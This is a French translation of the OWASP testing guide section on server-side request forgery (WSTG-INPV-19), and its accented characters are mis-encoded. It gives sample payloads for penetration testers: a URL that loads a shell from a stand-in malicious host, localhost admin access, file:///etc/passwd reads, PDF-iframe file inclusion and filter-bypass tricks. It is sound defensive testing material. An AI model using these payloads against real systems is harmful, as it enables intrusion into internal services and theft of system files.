# Test de contrefa�on de requ�te c�t� serveur

|ID          |
|------------|
|WSTG-INPV-19|

## Sommaire

Les applications Web interagissent souvent avec des ressources internes ou externes. Bien que vous puissiez vous attendre � ce que seule la ressource pr�vue traite les donn�es que vous envoyez, des donn�es mal g�r�es peuvent cr�er une situation dans laquelle des attaques par injection sont possibles. Un type d'attaque par injection est appel� Server-side Request Forgery (SSRF). Une attaque SSRF r�ussie peut accorder � l'attaquant l'acc�s � des actions restreintes, des services internes ou des fichiers internes au sein de l'application ou de l'organisation. Dans certains cas, cela peut m�me conduire � l'ex�cution de code � distance (RCE).

## Objectifs des tests

- Identifier les points d'injection SSRF.
- Tester si les points d'injection sont exploitables.
- �value la gravit� de la vuln�rabilit�.

## Comment tester

Lors du test de SSRF, vous essayez de faire en sorte que le serveur cibl� charge ou enregistre par inadvertance du contenu qui pourrait �tre malveillant. Le test le plus courant concerne l'inclusion de fichiers locaux et distants. Il existe �galement une autre facette de SSRF�: une relation de confiance qui survient souvent lorsque le serveur d'applications est capable d'interagir avec d'autres syst�mes principaux qui ne sont pas directement accessibles par les utilisateurs. Ces syst�mes dorsaux ont souvent des adresses IP priv�es non routables ou sont limit�s � certains h�tes. Comme ils sont prot�g�s par la topologie du r�seau, ils manquent souvent de contr�les plus sophistiqu�s. Ces syst�mes internes contiennent souvent des donn�es ou des fonctionnalit�s sensibles.

Consid�rez la requ�te suivante�:

``` http
GET https://exemple.com/page?page=about.php
```

Vous pouvez tester cette requ�te avec les charges utiles suivantes.

### Charger le contenu d'un fichier

```http
GET https://exemple.com/page?page=https://malicioussite.com/shell.php
```

### Acc�der � une page restreinte

```http
GET https://exemple.com/page?page=http://localhost/admin
```

Ou :

```http
GET https://exemple.com/page?page=http://127.0.0.1/admin
```

Utilisez l'interface de bouclage pour acc�der au contenu limit� � l'h�te uniquement. Ce m�canisme implique que si vous avez acc�s � l'h�te, vous avez �galement des privil�ges pour acc�der directement � la page `admin`.

Ce type de relations de confiance, o� les requ�tes provenant de la machine locale sont trait�es diff�remment des requ�tes ordinaires, sont souvent ce qui permet � SSRF d'�tre une vuln�rabilit� critique.

### R�cup�rer un fichier local

```http
GET https://exemple.com/page?page=file:///etc/passwd
```

### M�thodes HTTP utilis�es

Toutes les charges utiles ci-dessus peuvent s'appliquer � tout type de requ�te HTTP et peuvent �galement �tre inject�es dans les valeurs d'en-t�te et de cookie.

Une remarque importante sur SSRF avec les requ�tes POST est que le SSRF peut �galement se manifester de mani�re aveugle, car l'application peut ne rien renvoyer imm�diatement. Au lieu de cela, les donn�es inject�es peuvent �tre utilis�es dans d'autres fonctionnalit�s telles que les rapports PDF, la gestion des factures ou des commandes, etc., qui peuvent �tre visibles pour les employ�s ou le personnel, mais pas n�cessairement pour l'utilisateur final ou le testeur.

Vous pouvez en savoir plus sur Blind SSRF [ici](https://portswigger.net/web-security/ssrf/blind), ou dans la [section r�f�rences](#references).

### G�n�rateurs PDF

Dans certains cas, un serveur peut convertir les fichiers t�l�charg�s au format PDF. Essayez d'injecter des �l�ments `<iframe>`, `<img>`, `<base>` ou `<script>`, ou des fonctions CSS `url()` pointant vers des services internes.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Contournement du filtre commun

Certaines applications bloquent les r�f�rences � `localhost` et `127.0.0.1`. Cela peut �tre contourn� par :

-�Utilisation d'une autre repr�sentation�IP �valu�e � `127.0.0.1`�:
     - Notation d�cimale�: `2130706433`
     - Notation octale : `017700000001`
     - Raccourcissement IP : `127.1`
- Obfuscation des cha�nes
- Enregistrement de votre propre domaine qui se r�sout en `127.0.0.1`

Parfois, l'application autorise une entr�e qui correspond � une certaine expression, comme un domaine. Cela peut �tre contourn� si l'analyseur de sch�ma d'URL n'est pas correctement mis en �uvre, ce qui entra�ne des attaques similaires aux [attaques s�mantiques](https://tools.ietf.org/html/rfc3986#section-7.6).

- Utilisation du caract�re `@` pour s�parer les informations utilisateur de l'h�te�: `https://expected-domain@attaquant-domain`
- Fragmentation d'URL avec le caract�re `#`�: `https://attaquant-domaine#expected-domain`
- Encodage d'URL
- Fuzzing
- Combinaisons de tout ce qui pr�c�de

Pour des charges utiles suppl�mentaires et des techniques de contournement, consultez la section [r�f�rences](#r�f�rences).

## Correction

SSRF est connu pour �tre l'une des attaques les plus difficiles � vaincre sans l'utilisation de listes d'autorisation n�cessitant l'autorisation d'adresses IP et d'URL sp�cifiques. Pour en savoir plus sur la pr�vention SSRF, lisez la [Fiche de triche pour la pr�vention de la falsification des requ�tes c�t� serveur](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## R�f�rences

- [swisskyrepo�: charges utiles SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Lecture de fichiers internes � l'aide de la vuln�rabilit� SSRF] (https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [Cheatsheet OWASP Server Side Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger�: SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger�: SSRF aveugle](https://portswigger.net/web-security/ssrf/blind)
- [Webinaire Bugcrowd�: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Blog Hackerone�: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101�: SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [Syntaxe g�n�rique URI] (https://tools.ietf.org/html/rfc3986)
